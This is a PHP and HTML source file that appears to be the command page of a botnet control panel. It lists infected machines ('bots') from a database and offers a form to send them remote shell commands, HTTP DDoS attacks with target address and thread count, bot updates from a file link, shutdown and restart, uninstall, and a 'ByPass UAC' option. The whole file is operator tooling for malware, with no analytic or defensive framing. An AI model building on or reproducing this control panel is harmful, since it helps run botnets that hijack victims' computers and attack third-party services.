<div class="col">
  <div class="card mb-3 border-dark">
    <div class="card-header bg-dark text-success">
      <i class="fas  fa-wrench"></i>
      Commands Center
    </div>
    <div class="card-body bg-dark">
      <div class="table-responsive pb-4 text-success">
        <table class="table table-bordered text-success" width="100%" cellspacing="0">
          <thead>
            <tr>
              <th>Command</th>
              <th>Bots</th>
              <th>Execute</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>
                <select class="form-control bg-dark text-success" id="select1" name="cmd">
                  <option value="nocommand" selected>Select Command</option>
                  <optgroup label="Clients Commands">
                    <option value="q">Send Message</option>
                    <option value="c">CMD Execute</option>
                  </optgroup>
                  <optgroup label="DDOS Attack">
                    <option value="a">HTTP DDOS</option>
                    <option value="s">Stop DDOS</option>
                  </optgroup>
                  <optgroup label="Computer Commands">
                    <option value="y">Shutdown</option>
                    <option value="u">Restart</option>
                  </optgroup>
                  <optgroup label="Bot Configuration">
                    <option value="t">Terminate Application</option>
                    <option value="b">Update Bot</option>
                    <option value="d">Uninstall Bot</option>
                    <option value="r">ByPass UAC</option>
                  </optgroup>
                </select>
              </td>
              <td>
                <?php 
                include("inc/config.php");
                $query ="SELECT pcname from bots";
                $query_prc = mysqli_query($conn, $query) or die("Ошибка " . mysqli_error($conn)); 
                $bots_lenght=mysqli_num_rows($query_prc);
                mysqli_close($conn);
                echo ('<select class="form-control bg-dark text-success" id="target" name="target" required="required">');
                $i=0; 
                echo ("<option disabled selected>Select bot</option>");
                echo ("<option selected='all'>For all bots</option>");
                while ($i < $bots_lenght)
                {  
                  mysqli_data_seek($query_prc, $i);
                  $pcrow = mysqli_fetch_row($query_prc);
                  $pc = $pcrow[0];
                  echo ("<option>".$pc."</option>");
                  $i++;
                }
                ?>
              </td>
              <td>
                <button type="submit" name="Form1" for="Form1" class="btn btn-block btn-success text-dark">
                  Send Command
                </button>
              </td>
            </tr>
          </tbody>
        </table>
        <p><input id="input1" type="text" class="form-control form-control-sm bg-secondary text-success" placeholder="Message" name="message" style="display: none"></p>
        <p><input id="input2" type="text" class="form-control form-control-sm bg-secondary text-success" placeholder="Address" name="address" style="display: none"> 
  	    <input id="input3" type="text" class="form-control form-control-sm bg-secondary text-success" placeholder="Threads" name="threads" style="display: none"></p>
        <p><input id="input4" type="text" class="form-control form-control-sm bg-secondary text-success" placeholder="File link" name="downlink" style="display: none"></p>
        <p><input id="input5" type="text" class="form-control form-control-sm bg-secondary text-success" placeholder="CMD command" name="cmdshell" style="display: none"></p>
      <script type="text/javascript">
  	   var doc = document,
       sel = doc.getElementById('select1'),
       adds1 = doc.getElementById('input1');
       adds2 = doc.getElementById('input2');
       adds3 = doc.getElementById('input3');
       adds4 = doc.getElementById('input4');
       adds5 = doc.getElementById('input5');
       sel.addEventListener('change', function(){
       adds1.style.display = this.value == "q" ? 'block' : 'none';
       adds2.style.display = this.value == "a" ? 'block' : 'none'; 
       adds3.style.display = this.value == "a" ? 'block' : 'none';
       adds4.style.display = this.value == "b" ? 'block' : 'none';
       adds5.style.display = this.value == "c" ? 'block' : 'none'; 
      }, 
      false);
  </script>
      </div>
    </div>
  </div>
</div>